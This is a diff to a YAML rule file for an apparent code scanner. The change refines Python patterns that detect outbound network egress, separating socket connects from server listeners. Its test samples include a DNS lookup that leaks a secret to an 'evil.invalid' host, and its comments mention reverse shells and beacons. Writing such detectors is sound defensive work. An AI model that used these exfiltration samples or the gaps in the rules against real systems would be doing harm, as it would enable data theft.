@@ -346,7 +346,13 @@ rules:
         - '\burllib\s*\.\s*request\s*\.\s*urlopen\s*\('
         - '\burlopen\s*\('
         - '\bhttpx\s*\.\s*(?:get|post|put|patch|request|Client)\s*\('
-        - '\bsocket\s*\.\s*(?:socket|create_connection)\s*\('
+        # Egress is a connection *out*, not a socket object: a server calls `socket.socket()` too
+        # and then binds and listens, sending nothing (census D, bind-serve vs connect-exec:
+        # ESocketS, PyWCGIshell). `create_connection` connects; a bare socket is scored only when it
+        # connects to a `(host, port)` tuple -- which a reverse shell or beacon does and a listener
+        # does not -- while `bind`/`listen`/`accept` stay unscored.
+        - '\bsocket\s*\.\s*create_connection\s*\('
+        - '\.\s{0,4}connect\s{0,4}\(\s{0,4}\('
         - '\bhttp\s*\.\s*client\s*\.\s*HTTP(?:S)?Connection\s*\('
         # Additions. Every allow-list of method names is a list the attacker
         # reads too, and these were the holes: a real download primitive, the
@@ -371,9 +377,12 @@ rules:
         - "urllib.request.urlretrieve(url, '/tmp/x')"
         - "socket.gethostbyname(secret + '.evil.invalid')"
         - "smtplib.SMTP('mail.example.invalid')"
+        - "s.connect((host, port))"
       negative:
         - "response = cache.get(key)"
         - "# requests are proxied through the gateway"
+        # A server binds and listens: it creates a socket and sends nothing out.
+        - "srv = socket.socket()\nsrv.bind((host, port))\nsrv.listen(5)\nconn, addr = srv.accept()"
 
   - id: CAP.PY.SOCKET_LITERAL.001
     version: 1.0.0
